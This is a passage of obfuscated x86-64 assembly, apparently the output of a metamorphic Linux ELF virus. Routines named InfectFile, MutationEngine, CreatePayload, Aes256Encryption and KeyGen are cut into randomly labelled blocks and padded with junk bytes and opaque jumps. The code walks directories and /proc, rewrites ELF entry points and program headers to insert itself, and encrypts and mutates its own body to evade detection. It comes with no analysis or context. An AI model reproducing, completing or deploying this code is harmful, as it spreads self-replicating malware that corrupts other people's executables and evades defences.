    jns         ..@mDYAqODNm7tO
..@GxtQtVk6t89u:
    xor         rax, rax
    jmp         $+3
db 0xd8
    jb          ..@ev1e9lrPjkna
    jae         ..@ev1e9lrPjkna
..@zzBFybVeIetA:
    xor         rax, rax
    rep         nop
    jmp         $+3
db 0x84
    js          ..@BXt7N3aK2lZ0
    jns         ..@BXt7N3aK2lZ0
..@5KssRmNcpAmJ:
    xor         rcx, rcx
    jl          ..@U5oAns7d6WjB
    jge         ..@U5oAns7d6WjB
..@oV7GA36w4St0:
%ifdef X86_32
    mov         edx, 11b
    mov         esi, 0x22
    mov         edi, 0xffffffff
    push        ebp
    xor         ebp, ebp
%endif
    jmp         $+4
db 0xc2, 0xcd
    jmp         $+4
db 0x89, 0x1c
    jb          ..@hJsBysElndlZ
    jae         ..@hJsBysElndlZ
..@EkUnOYFCRKBF:
    mov         rax, 0x40
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    jmp         $+4
db 0xdd, 0xde
    js          ..@pgIhDN3P7VAV
    jns         ..@pgIhDN3P7VAV
..@SpdI1uIgoVLi:
%ifdef X86_64
    cmp         edx, 90584150h
%endif
    jl          ..@9pwDhZaUxfmM
    jge         ..@9pwDhZaUxfmM
..@p5D0BgpKpiKj:
    mov         eax, SYS_MREMAP
    jmp         $+3
db 0x1c
    jmp         ..@LDENVXgn6rTI
..@QiJX3p34IQf0:
%ifdef X86_64
    mov         rcx, rdx
%endif
    js          ..@c72vBiaa7bkx
    jns         ..@c72vBiaa7bkx
..@DvAp575FV3tT:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    js          ..@Ne9zvfOSym1T
    jns         ..@Ne9zvfOSym1T
..@PfQkLttEW8oT:
    call        Strcpy
    mov         BYTE [r1], '/'
    jmp         $+3
db 0xfc
    jb          ..@f7tqLXy4npbd
    jae         ..@f7tqLXy4npbd
..@3HJ6hmgjhQvd:
    rep         nop
    jl          ..@Xwb3eli0aMYQ
    jge         ..@Xwb3eli0aMYQ
..@xw1JAInNwJs0:
    mov         edx, 100000000b
    js          ..@41mnJvSAcpmx
    jns         ..@41mnJvSAcpmx
..@sQoaAWVSO6Me:
    ret
    jmp         $+5
db 0xb6, 0xcc, 0x71
    jmp         $+5
db 0x4f, 0x99, 0x3f
    jmp         $+4
db 0x2b, 0x36
    jb          ConvertJumpToDoubleJump
    jae         ConvertJumpToDoubleJump
..@ZNgOpIESDF9i:
    push        r4
    push        r5
    sub         rsp, _UPDATASIG_OFF_size
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    jmp         $+5
db 0xcc, 0x1b, 0x91
    jmp         $+3
db 0x74
    jmp         $+3
db 0x65
    jl          ..@SiOGf3VBjZk2
    jge         ..@SiOGf3VBjZk2
..@CyAUwDxMMzWh:
    jmp         ..@iawM7tZH8Wh9
    jl          ..@iawM7tZH8Wh9
    jge         ..@iawM7tZH8Wh9
..@n8SMFATxLf05:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    jmp         $+4
db 0xe2, 0x76
    jl          ..@TCifyvYk1z6G
    jge         ..@TCifyvYk1z6G
..@xVbMj5cwtZ7M:
    call        ConvertPushPopToMove
    jl          ..@EkUnOYFCRKBF
    jge         ..@EkUnOYFCRKBF
ConvertPushPopToMove:
    jmp         ..@2nFV4etBsEJz
..@fGJ5KuDaOruK:
%ifdef X86_64
    jz          ..@9BU3ONjy7IwK
    mov         WORD [rdi], bx
%endif
    jmp         ..@nOJ1qVRAuCvg
..@0cuwo91qh6ib:
    xchg        rbx, rbx
    mov         r1, r5
    xchg        rdi, rdi
    push        rax
    mov         rdx, rdx
    jb          ..@fLlNpfppFjj3
    jae         ..@fLlNpfppFjj3
..@nvCg32xt3SVZ:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         ..@4vmCv80yWkBf
..@hgVmWbx8H7mU:
    cmp         BYTE [r1+16], ET_DYN
    jmp         $+4
db 0x48, 0x68
    jmp         $+5
db 0x3d, 0xb9, 0x17
    jmp         ..@KcpbLpWlDyrk
..@2nFV4etBsEJz:
    push        rsi
    push        rcx
    mov         rdi, rsi
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    js          ..@evFhwfTE4scP
    jns         ..@evFhwfTE4scP
..@9ZVDx8XmX6vs:
%ifdef X86_64
    and         edx, 0ffc0fffah
    cmp         edx, 90c08948h
    push        rax
%endif
    jb          ..@HkZQYnrymA8A
    jae         ..@HkZQYnrymA8A
..@iP0aQtdSq2Mo:
    and         edx, 000f000f0h
    jmp         $+4
db 0x5e, 0xbb
    jmp         $+3
db 0xb3
    jb          ..@zNfQUJXChVl5
    jae         ..@zNfQUJXChVl5
..@ZUP43WJoR2fl:
    mov         rbp, rbp
    jmp         $+5
db 0xb7, 0xa4, 0xe5
    jmp         ..@7HrcPnahZaDb
..@h8QzC8xIIxzC:
    je          ..@bP0HUpeBx2BA
    jmp         $+4
db 0xa6, 0x6a
    jmp         ..@PUoboefzrrH6
..@vRLoJlKb0VNg:
    push        rbx
    push        rdx
    pop         rdx
    pop         rbx
    jmp         $+4
db 0x30, 0x27
    jl          ..@MNCPEWn7w6vD
    jge         ..@MNCPEWn7w6vD
..@5mMwLhFb9YM3:
    cmp         edx, ebx
    jmp         $+4
db 0x2f, 0x23
    jmp         $+4
db 0x81, 0xc0
    jmp         ..@5GABoPVFxNRV
..@QYe6qURvDIRR:
    je          ..@DcR1SZ1r5dxv
    push        rcx
    pop         rcx
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         $+3
db 0x2c
    jb          ..@7bjy1DHD6ZDp
    jae         ..@7bjy1DHD6ZDp
..@BD5q5VSYh8Ed:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    push        rcx
    pop         rcx
    jmp         $+3
db 0x82
    js          ..@4kN5jTKqzUHC
    jns         ..@4kN5jTKqzUHC
..@B8s0wfsX2IJJ:
    test        al, al
    jnz         ..@qQ5wZbRc5imi
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x5b
    jmp         $+3
db 0xf0
    jb          ..@KbAiB4IoDMzW
    jae         ..@KbAiB4IoDMzW
..@xaDeOcT6mIBN:
    ret
    jb          IsELFComplete
    jae         IsELFComplete
..@Ybo8PavefWgm:
    mov         rdi, QWORD [rsp+_MUTA_OFF.start]
    jmp         $+5
db 0x19, 0x46, 0x01
    jmp         $+5
db 0x64, 0xc8, 0x9b
    jmp         ..@ez7h1zSEhStk
..@XKsfKANGYJCy:
    cmp         BYTE [rdi+rcx], 90h
    jne         ..@CBPHKBGlYIvo
    jmp         $+3
db 0x8a
    jmp         $+5
db 0x54, 0x49, 0xb9
    jb          ..@ZFcF9kPg4HJN
    jae         ..@ZFcF9kPg4HJN
..@fAj2TPiKQJbq:
    push        r4
    jmp         $+4
db 0xcb, 0xa0
    je          ..@VTL5HinrRqjG
    jne         ..@VTL5HinrRqjG
..@po2lz8fa5reh:
    add         rsp, 0x100
    jmp         ..@ByUfPNdC9dx8
..@yNJuygIQ3MC0:
    mov         ax, WORD [r5+e_h.e_shentsize]
    mul         r2
    jmp         $+5
db 0xae, 0xb1, 0x6f
    jb          ..@pvrsuNFTJjmY
    jae         ..@pvrsuNFTJjmY
..@74rAQViup9WB:
%ifdef X86_32
    cmp         dl, 05h
    je          ..@gdxWmThcBjhG
%endif
    je          ..@sk477QUoyetp
    jne         ..@sk477QUoyetp
..@37fbOdTdTkV1:
    xor         r3, r3
    xor         r4, r4
    mov         rax, SYS_WAIT4
    jmp         $+4
db 0x2d, 0x9a
    jmp         ..@HHwHEO0zFE0O
..@Gxszv0dQm1DI:
    mov         rax, SYS_GETUID
    syscall
    test        eax, eax
    jnz         ..@2Z4swjLqutRn
    jmp         $+4
db 0xde, 0x73
    jmp         ..@NkQ8Ks925khj
..@uwE2Xwx42XOY:
    jbe         ..@taOavz6LgImf
    jl          ..@UDS8KtqDLaRE
    jge         ..@UDS8KtqDLaRE
..@4NvJF1YSd8ig:
%ifdef X86_64
    and         dx, 0700h
    mov         bx, 5841h
    or          bx, dx
%endif
    jmp         $+4
db 0xec, 0x8d
    jl          ..@cnUflh1XMavX
    jge         ..@cnUflh1XMavX
..@E5yjvm3u6KN7:
%ifdef X86_64
    cmp         edx, 00e88348h
    je          ..@gdxWmThcBjhG
%endif
    jmp         $+5
db 0x09, 0xc1, 0x30
    jl          ..@6hzjPsn3bhjT
    jge         ..@6hzjPsn3bhjT
DestroyPayload:
    jmp         ..@8ctNcA5siFSS
..@V4f7ofBIN9Yb:
    pop         rsi
    jmp         $+5
db 0x88, 0x76, 0x1f
    jl          ..@ooa8OaoCpFoQ
    jge         ..@ooa8OaoCpFoQ
..@KFClf28MmUCY:
    test        rax, rax
    jmp         $+3
db 0x67
    jmp         $+5
db 0x8a, 0xdd, 0xc6
    js          ..@tNTe75tZ3tKQ
    jns         ..@tNTe75tZ3tKQ
..@nOJ1qVRAuCvg:
%ifdef X86_64
    add         rdi, 2
    jmp         ..@htDn977aXKPk
    mov         rsi, rsi
%endif
    jmp         ..@ckbyFAVsOnxi
..@JxcjGNf8Nxt2:
    pop         rsi
    jmp         ..@IEnitZlsPgmD
..@5ljh3apFR9bw:
    jmp         ..@wK08yBowSRx0
    jmp         $+4
db 0xea, 0x31
    jl          ..@3cqUy7fXbEn9
    jge         ..@3cqUy7fXbEn9
..@HBQERJi8jtM0:
    mov         bl, 0ebh
    jmp         ..@lafPxKScuuDJ
..@0KzV0jr8sKBE:
    add         rdi, 1
    jmp         $+5
db 0x80, 0xd4, 0xb5
    jmp         $+4
db 0xbd, 0x58
    js          ..@htDn977aXKPk
    jns         ..@htDn977aXKPk
..@cHUe3JCPyWyu:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    mov         r2, 11b
    jmp         $+4
db 0x6d, 0x99
    jmp         ..@gHvVvItWZLAa
..@c0Nwn6rm9wMr:
    pop         rax
    mov         bx, dx
    jb          ..@HSJ4lcpFQXpd
    jae         ..@HSJ4lcpFQXpd
..@K9L7tyLe1gkV:
    call        ConvertMoveZeroToXor
    jmp         $+3
db 0x9a
    jmp         ..@dwzytAqcExQt
..@3H7GThB2XPEB:
    xor         rdi, rdi
    xor         rdx, rdx
    xor         rbx, rbx
    xor         rcx, rcx
    mov         ebx, esi
    je          ..@DYdCGtIYp3R8
    jne         ..@DYdCGtIYp3R8
..@DeWW3nBojH9f:
    xor         rcx, rcx
    js          ..@tjNeLYzrnPBh
    jns         ..@tjNeLYzrnPBh
..@GoS1FmsVFr4p:
    cmp         eax, 0x00
    js          ..@2bsuNfDECGct
    jns         ..@2bsuNfDECGct
..@OlJa7u3N3f4o:
    lea         r3, [rsp+_NBF_OFF.key]
    call        Aes256Encryption
    mov         r1, [rsp+_NBF_OFF.file]
    jmp         $+4
db 0xe5, 0x24
    js          ..@vV2y23mKYURm
    jns         ..@vV2y23mKYURm
..@c0lJi2sKipa0:
    push        rcx
    pop         rcx
    jne         ..@zkjNEYpBT8he
    add         r2, rax
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    jmp         $+4
db 0x88, 0x47
    js          ..@rw5CggJ0klCA
    jns         ..@rw5CggJ0klCA
..@bUgqp3golPjJ:
    mov         rcx, rcx
    mov         r1w, WORD [rsp+r4]
    jmp         $+3
db 0xd0
    jmp         ..@GKGnQXZ3RWSJ
..@H48mxo4ZYiqj:
%ifdef X86_64
    shr         bx, 8
%endif
    jmp         $+5
db 0xc2, 0x6c, 0x4d
    js          ..@gdNmfhyGSQvz
    jns         ..@gdNmfhyGSQvz
..@ofhzvqgLX4bC:
    mov         QWORD [rsp+_UPDATASIG_OFF.meta_ptr], r4
    xchg        rax, rax
    jmp         $+3
db 0xe0
    jmp         $+5
db 0xa9, 0xd5, 0x59
    jmp         ..@65Lpe5sDJH7q
..@c72vBiaa7bkx:
%ifdef X86_32
    mov         edi, r1
    mov         esi, r2
%endif
    jmp         $+3
db 0xa2
    jmp         $+3
db 0x67
    jmp         ..@Z8cMVypwe6Rh
..@UhuHyYbjnd1X:
    jmp         ..@LCVrLHKyODmi
    js          ..@M4cHhnBrLgV8
    jns         ..@M4cHhnBrLgV8
..@IkRDK4St7jSq:
%ifdef X86_32
    shr         edx, 8
%endif
    jmp         ..@A4vsXHx2FeNQ
ConvertDoubleJumpToJump:
    jmp         ..@fG9LCFslsJlP
..@l38qhbFxkQUe:
    xchg        rsi, rsi
    test        al, al
    jz          ..@dwzytAqcExQt
    mov         rcx, rcx
    xchg        rdx, rdx
    jmp         $+3
db 0x34
    jmp         $+3
db 0xaf
    je          ..@K9L7tyLe1gkV
    jne         ..@K9L7tyLe1gkV
CreatePayload:
    jmp         ..@mYkLebdHSexq
..@dBK3BZv6jIex:
    cmp         edx, 000000b8h
    push        rbx
    pop         rbx
    je          ..@youNcdonY06s
    je          ..@C29an8t6RpjR
    jne         ..@C29an8t6RpjR
..@YDV3d0aiciTx:
%ifdef X86_32
    mov         esi, 0x01
    mov         edi, DWORD [edi+file.filefd]
%endif
    jmp         $+5
db 0xca, 0x31, 0xfa
    jmp         $+4
db 0xec, 0x6e
    jb          ..@XHKvzoq4f7De
    jae         ..@XHKvzoq4f7De
..@ookx2loQQX4z:
    push        rsi
    push        rcx
    push        rbx
    pop         rbx
    jmp         ..@PGaRVeFN5boa
..@w6wDqMr4EPHT:
    cmp         rax, (-1)
    je          ..@DalaUHGULF3H
    xor         r3, r3
    jl          ..@qNWheN5ozX01
    jge         ..@qNWheN5ozX01
..@hPR4JOIMnNXP:
    mov         r5, r1
    jmp         ..@wdlPM2P4Cse1
..@lFrWsq1DubUZ:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    mov         rbx, rbx
    jmp         $+4
db 0xce, 0x81
    jmp         $+3
db 0x6a
    jmp         $+3
db 0x9a
    jmp         ..@PfQkLttEW8oT
..@KaUfKlRM08J4:
    jne         ..@4vmCv80yWkBf
    jmp         $+4
db 0x73, 0x17
    jmp         ..@XeJTvrWOLO6j
..@xERkZw7WZqtu:
    jge         ..@AIvh7ob04Y3C
    jmp         $+3
db 0x14
    jmp         $+4
db 0x09, 0xe3
    jl          ..@tIy3Ab5iZYpn
    jge         ..@tIy3Ab5iZYpn
..@GULnuZw76XHM:
%ifdef X86_32
    shr         ebx, 8
%endif
    jmp         $+4
db 0xef, 0x46
    jmp         ..@RXsEaJL0ETMH
..@0pvuqtv98zwb:
    mov         r2, non_encrypted_len
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    call        MutationEngine
    push        rsi
    js          ..@JxcjGNf8Nxt2
    jns         ..@JxcjGNf8Nxt2
..@OE6YWcPhYsKx:
    sub         rsp, _INFDIR_OFF_size
    js          ..@Fv9OZ5UIfD57
    jns         ..@Fv9OZ5UIfD57
..@1Bba7IWAZU7G:
    jmp         ..@KL2hLTP2onaO
    jmp         ..@NUUNUHrgLb9F
..@ja94r1dcVAAF:
%ifdef X86_32
    je          ..@gdxWmThcBjhG
%endif
    jmp         $+4
db 0x65, 0x50
    jmp         ..@74rAQViup9WB
..@xzKJOl5ljmTw:
    sub         rsp, _INFFILE_OFF_size
    jmp         $+5
db 0x30, 0x30, 0xe7
    jmp         ..@jotUJsGkIQRK
..@6rDQbVUrDv2Y:
%ifdef X86_64
    mov         rax, rsi
    mov         rsi, rsi
    and         rax, 1b
    xchg        rax, rax
%endif
    jmp         $+5
db 0xc0, 0xa5, 0x09
    jmp         ..@yUP3BprJtnBP
..@2LMvRXojCLPo:
    ret
    jmp         $+4
db 0xec, 0xe8
    js          ..@UY1dteWuWwNS
    jns         ..@UY1dteWuWwNS
..@gvR834lDN6hJ:
%ifndef ENABLE_DEBUGGING
    xchg        rbx, rbx
%endif
    js          ..@3BT6jD2P7RVA
    jns         ..@3BT6jD2P7RVA
..@Cw32mx3ZpcZh:
    pop         rdx
    mov         QWORD [rsp+_AESE_OFF.startaddr], r1
    push        rdi
    pop         rdi
    jmp         ..@M94fLfKiuLbH
..@dQrhTO9z3HpS:
    push        rdi
    pop         rdi
    mov         rsp, rsp
    sub         rsp, _PROC_OFF_size
    VAR         packed, procdir
    jmp         $+5
db 0xd1, 0x47, 0x22
    jmp         $+3
db 0x4d
    jmp         $+5
db 0x88, 0x76, 0xf9
    jmp         $+4
db 0x88, 0xa6
    jmp         ..@dXdWb92EbqNd
..@Mi3Xc53aYSbj:
%ifdef X86_64
    mov         rcx, rcx
%endif
    jmp         ..@g7vJ0BUKsVpU
..@ch0S0WKV53LI:
    xor         rbx, rbx
    jmp         $+4
db 0xd8, 0x03
    jmp         $+3
db 0xa1
    jmp         ..@JsytMmvyRtQS
..@SXQaYtKVtcmF:
    cmp         rax, 0
    jmp         $+3
db 0x23
    js          ..@Os05eU1OGvqZ
    jns         ..@Os05eU1OGvqZ
..@qTjVhWrcA0J5:
    mov         eax, ebx
    and         eax, edx
    test        eax, eax
    jnz         ..@wt7LQzCE2Ont
    jmp         $+3
db 0x23
    jmp         $+5
db 0x54, 0x51, 0xf2
    jmp         $+5
db 0x8e, 0xb9, 0xbc
    jb          ..@aUlNTJ9JlspS
    jae         ..@aUlNTJ9JlspS
..@ZFcF9kPg4HJN:
    jne         ..@uouuIU7uTAjT
    jmp         $+4
db 0xb8, 0x41
    jl          ..@Sed0vnx10TZF
    jge         ..@Sed0vnx10TZF
..@7V11hKZENfww:
    pop         rax
    js          ..@NOTozCvc8HGp
    jns         ..@NOTozCvc8HGp
..@MO3HrD0JdRhF:
    mov         rax, 1
    jmp         $+5
db 0x3f, 0xee, 0xda
    jmp         $+5
db 0x95, 0xaa, 0xf7
    jmp         $+5
db 0x85, 0x77, 0x59
    jb          ..@MtH4L9FmJIh7
    jae         ..@MtH4L9FmJIh7
..@4kN5jTKqzUHC:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    rep         movsb
    push        rdx
    pop         rdx
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jl          ..@coBtSnJdyNR4
    jge         ..@coBtSnJdyNR4
..@jDbfg0LSLKqd:
    sub         rsp, 0x100
    push        0x00
    jb          ..@Gxszv0dQm1DI
    jae         ..@Gxszv0dQm1DI
..@Aj6xbsZmnhcr:
%ifndef ENABLE_DEBUGGING
    jl          ..@gvR834lDN6hJ
%endif
    jmp         $+3
db 0x53
    jmp         ..@of6Jhzl4bu2W
..@fLFwnivdek04:
    xor         rax, rax
    mov         dl, BYTE [rsi]
    cmp         dl, 05h
    push        rcx
    pop         rcx
    jl          ..@WkxFEhI1Kazg
    jge         ..@WkxFEhI1Kazg
..@ojcTkrFFqs0D:
    mov         rdx, rdx
    jb          ..@XROwkKMgKxf4
    jae         ..@XROwkKMgKxf4
..@ITaobB6qTfRS:
    xchg        rcx, rcx
    pop         rax
    jmp         ..@QcCcZJPVmt4B
..@lxQLQkVAT7g2:
    mov         DWORD [r2], PT_LOAD
    mov         QWORD [r1+e_h.e_entry], r3
    push        rdx
    pop         rdx
    jmp         $+5
db 0xe6, 0x0a, 0x27
    jmp         ..@qLuf1Y1MpArI
..@haRbOg9LT44q:
    mov         bx, dx
    jmp         ..@HBQERJi8jtM0
..@bP0HUpeBx2BA:
    push        rax
    pop         rax
    mov         rdx, rdx
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         ..@4fbtWs06FyNh
..@rkrWoa7ccYHV:
    cmp         BYTE [r1], 0x00
    jmp         ..@PiG72qTh9F2y
..@8ctNcA5siFSS:
    xor         rax, rax
    rep         nop
    xor         rcx, rcx
    push        rcx
    jmp         ..@SIqB0Zi0KJ2B
..@YOJnPV0ivFmj:
    push        r1
    push        rdi
    jmp         $+5
db 0x99, 0x7b, 0x48
    jl          ..@4OWDHuxieycO
    jge         ..@4OWDHuxieycO
..@fnonzxsl0K3R:
    cmp         BYTE [r5], DT_DIR
    jne         ..@M4cHhnBrLgV8
    jmp         $+3
db 0xd9
    jmp         ..@3xLrYrKEc6zb
..@IvXCBXBljDaW:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xc0]
    aesenc      xmm0, xmm1
    jb          ..@PhL1cBxO8qMQ
    jae         ..@PhL1cBxO8qMQ
..@6lO7RH6fXQWX:
%ifdef X86_32
    xchg        rdi, rdi
    push        rbx
%endif
    jb          ..@5c9mMpqNNiTx
    jae         ..@5c9mMpqNNiTx
..@JQF4qpdpBtOl:
    ret
    jmp         $+4
db 0x64, 0xb9
    jl          KeyGen
    jge         KeyGen
..@S8VVI7PoVgbs:
    push        r2
    push        r3
    sub         rsp, _KEYGEN_OFF_size
    jmp         $+4
db 0xf6, 0x08
    jmp         $+4
db 0x34, 0x06
    jmp         ..@BZY4pInrgK5y
..@AIvh7ob04Y3C:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+5
db 0x49, 0xca, 0xb9
    jmp         ..@i5dYIoxQ6q8D
..@wgs5h2i6lQu8:
    push        rsi
    pop         rsi
    jmp         $+4
db 0x22, 0xbb
    jl          ..@MrHlzjFuP7z5
    jge         ..@MrHlzjFuP7z5
..@tlPZ0p0R5qc5:
    xor         r2, r2
    mov         r1, m6
    jmp         ..@NK6hc6shoqR1
..@yH8miNbVVAxg:
    ret
    jmp         $+3
db 0xf7
    jmp         $+3
db 0xd0
    jb          NonBinaryFile
    jae         NonBinaryFile
..@Bjy62HeTppFh:
    pop         rdx
    js          ..@G4E9hsQ8aRi5
    jns         ..@G4E9hsQ8aRi5
..@q0AIP3uR2TQK:
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        IsNum
    test        eax, eax
    jz          ..@OWPLnCHNh4r5
    jmp         $+5
db 0x03, 0x22, 0xdc
    js          ..@ttjYNkhJQiQh
    jns         ..@ttjYNkhJQiQh
..@YwgokvLRa0j4:
    xchg        rsi, rsi
    jmp         $+5
db 0xeb, 0x12, 0x9f
    jmp         $+4
db 0x65, 0xfb
    jl          ..@R0sdzrvxfGnM
    jge         ..@R0sdzrvxfGnM
..@5e941Z6tOgQO:
    mov         rdx, rdx
    jmp         ..@VDEcVZ8bEGdD
..@z2XvYKonL7kK:
    jmp         ..@wgs5h2i6lQu8
    jmp         $+3
db 0x01
    js          ..@kevalbgCh927
    jns         ..@kevalbgCh927
..@VZw4RTBniFLE:
    OFILE       [r1], 0x10000
    jmp         $+3
db 0x8f
    js          ..@YgxEr2JNaDPz
    jns         ..@YgxEr2JNaDPz
..@pLPYkcSOrOsl:
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    mov         r2, QWORD [r1+e_h.e_phoff]
    mov         rsp, rsp
    add         r2, r1
    jmp         $+4
db 0xfd, 0x4c
    je          ..@ejHB3PlfjiGZ
    jne         ..@ejHB3PlfjiGZ
..@rw5CggJ0klCA:
    mov         QWORD [r2+p_h.p_offset], r3
    push        r2
    xchg        rcx, rcx
    push        r3
    js          ..@48E7KTDwTzEA
    jns         ..@48E7KTDwTzEA
..@ZqdokFNNNXYD:
    pop         rax
    je          ..@I8YhNOgZ6gI7
    jne         ..@I8YhNOgZ6gI7
..@QlqorZcy4xwC:
%ifdef X86_64
    or          bl, 101b
%endif
    js          ..@IbJjKztN2za0
    jns         ..@IbJjKztN2za0
AddSizeMappedFile:
    jmp         ..@fAj2TPiKQJbq
..@GGMr1f8chki4:
    mov         eax, SYS_LSEEK
    syscall
    cmp         eax, 0x0
    jle         ..@GxtQtVk6t89u
    jmp         $+5
db 0xbb, 0x0f, 0x54
    jmp         $+3
db 0x55
    jb          ..@1Yt8ZOPK46Rl
    jae         ..@1Yt8ZOPK46Rl
..@ahYMfV1k7QC5:
    mov         r3, rax
    call_vsp    Strncmp
    js          ..@EFvFn3Fnpi4e
    jns         ..@EFvFn3Fnpi4e
..@7Y7iAZJ3XIRl:
    mov         DWORD [rdi], eax
    jl          ..@8OPpJKfPsm72
    jge         ..@8OPpJKfPsm72
..@PZYS1PQiiHrf:
%ifdef X86_32
    pop         ebp
%endif
    jmp         ..@94Quf9SwLYLk
..@58XkK2iApQsx:
    movdqu      xmm0, [rsi+rcx]
    movdqu      xmm1, oWORD [rsp]
    pxor        xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x10]
    jmp         ..@SZha7gGCoou7
..@CMXtnQpIF3Ly:
    xor         rax, rax
    jmp         $+3
db 0xa2
    jmp         $+3
db 0x04
    jmp         $+5
db 0x6d, 0xc3, 0xa3
    jmp         ..@uEfEuZy6tVyg
..@4uxOF6PnQ6lo:
%ifdef X86_64
    shl         rbx, 8
    mov         bl, 48h
%endif
    je          ..@8XLyANh7QliA
    jne         ..@8XLyANh7QliA
..@CBPHKBGlYIvo:
    xchg        rdx, rdx
    mov         rbp, rbp
    add         ecx, 1
    push        rsi
    pop         rsi
    jmp         $+5
db 0x22, 0xa8, 0x47
    jmp         ..@Ed24WXNggmx0
..@F9j0xrzkEURk:
    xor         rax, rax
    jmp         $+5
db 0xd8, 0xc6, 0x34
    jb          ..@8g1ELgQLkamp
    jae         ..@8g1ELgQLkamp
..@SIqB0Zi0KJ2B:
    pop         rcx
    mov         rdi, m6
    jmp         $+3
db 0xbc
    jmp         $+3
db 0xeb
    jb          ..@7kykCKsLwlgY
    jae         ..@7kykCKsLwlgY
..@Dq1xoShcutUB:
    mov         QWORD [rsp+_MUTA_OFF.start], r1
    mov         DWORD [rsp+_MUTA_OFF.size], r2d
    jmp         $+4
db 0xa1, 0x25
    jmp         ..@eRoiS8OXKmQL
..@QQU6XlGFotl5:
    jne         ..@kKkjwJO0fIuY
    cmp         BYTE [r1+16], ET_EXEC
    je          ..@KgAeZ8y7ds3C
    jb          ..@hgVmWbx8H7mU
    jae         ..@hgVmWbx8H7mU
..@ZOkfa0Bd3hGl:
%ifdef X86_64
    je          ..@gdxWmThcBjhG
    cmp         dx, 0548h
%endif
    js          ..@vNWlotnSaDKX
    jns         ..@vNWlotnSaDKX
..@eroJriVyYHlj:
%ifndef ENABLE_DEBUGGING
    push        rax
    pop         rax
    mov         r1, rax
    push        rbx
%endif
    jl          ..@inhzeTnUo50S
    jge         ..@inhzeTnUo50S
..@SUP8zf0BfrqA:
    jmp         ..@cSFWXWmVimkw
    jmp         $+5
db 0x88, 0xe4, 0x8d
    jmp         ..@cvv6wNopR8si
..@EtHK6LAzEomK:
    sub         ecx, 6
    mov         WORD [rdi+6], dx
    mov         DWORD [rdi+8], ecx
    jmp         ..@6B6oeBX9t6Du
    je          ..@fdgLf0HkYCAP
    jne         ..@fdgLf0HkYCAP
..@zKk5DtADWxjG:
    jne         ..@4TPEtJo8RX6O
    mov         rsi, rsi
    xor         rsi, rsi
    jmp         $+4
db 0x4b, 0x34
    jmp         $+4
db 0x8e, 0x55
    jmp         $+5
db 0xce, 0xfa, 0xbb
    jmp         $+3
db 0x12
    jmp         ..@h8FA3g9lx6FO
..@8z4ZU9ypC5Ok:
    ret
    jl          ConvertXorToMoveZero
    jge         ConvertXorToMoveZero
Strcpy:
    jmp         ..@gWIIAyaINQib
..@vNWlotnSaDKX:
%ifdef X86_64
    je          ..@gdxWmThcBjhG
%endif
    jmp         $+4
db 0x67, 0xcd
    js          ..@mPaUXkg76Okg
    jns         ..@mPaUXkg76Okg
..@2fT7YSDc1jBm:
%ifndef ENABLE_DEBUGGING
    mov         r2d, 0x1
    mov         r3d, 0x6
    xchg        rbx, rbx
    push        rcx
    pop         rcx
%endif
    jmp         $+3
db 0xc8
    js          ..@xhje092mO9gB
    jns         ..@xhje092mO9gB
..@9xgiEAfkS5c8:
    add         rdi, 5
    jb          ..@GUgKwvW1EUBQ
    jae         ..@GUgKwvW1EUBQ
..@TohcD9rvi8Bl:
    push        rax
    jmp         $+5
db 0x47, 0x2c, 0x42
    jl          ..@c0Nwn6rm9wMr
    jge         ..@c0Nwn6rm9wMr
..@LdLRXimyjpIc:
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    push        rdx
    pop         rdx
    jmp         $+4
db 0xbe, 0xb1
    jmp         $+3
db 0x85
    jmp         $+3
db 0xb7
    jmp         $+3
db 0xaf
    jmp         ..@SxWkm23Z9si6
..@dwMeijCOhfdV:
    pop         rdx
    jmp         ..@7V11hKZENfww
..@NK6hc6shoqR1:
    mov         r2, original_virus_len+PADDING
    mov         eax, SYS_MUNMAP
    syscall
    jb          ..@AJK520bum0Tk
    jae         ..@AJK520bum0Tk
..@0CWJ51Om8H36:
    shl         rbx, 8
    jmp         ..@SRxVFdmFnJYt
..@4hqjuZJ77y1o:
    pop         rax
    mov         rsi, rsi
    jmp         $+5
db 0x6a, 0xa4, 0x7b
    jmp         ..@ezIdsfLkQfq3
ConvertAddToSub:
    jmp         ..@8yfbo8TzUkTt
FileValidation:
    jmp         ..@hPR4JOIMnNXP
..@CcRAlI1d7vXN:
    je          ..@Sed0vnx10TZF
    mov         rsi, rsi
    mov         DWORD [rsp+_MUTA_OFF.index], ecx
    jne         ..@4iebUHvgcqoo
    jmp         ..@NcHpm1IzVJQN
..@4iebUHvgcqoo:
    push        rbx
    jmp         $+4
db 0xd4, 0xe5
    jmp         $+4
db 0x25, 0xfa
    jmp         $+3
db 0xbe
    js          ..@Dk1f4xc6gGi8
    jns         ..@Dk1f4xc6gGi8
..@GBm0C6d5zdHE:
    jne         ..@jC70PiACmW9r
    jmp         $+5
db 0x93, 0x41, 0x65
    jmp         ..@jC70PiACmW9r
..@73vNfyYZLPTo:
    xchg        rbx, rbx
    add         rsp, _INFDIR_OFF_size
    ret
    jmp         InfectFile
..@Mjmgh3R4cnSn:
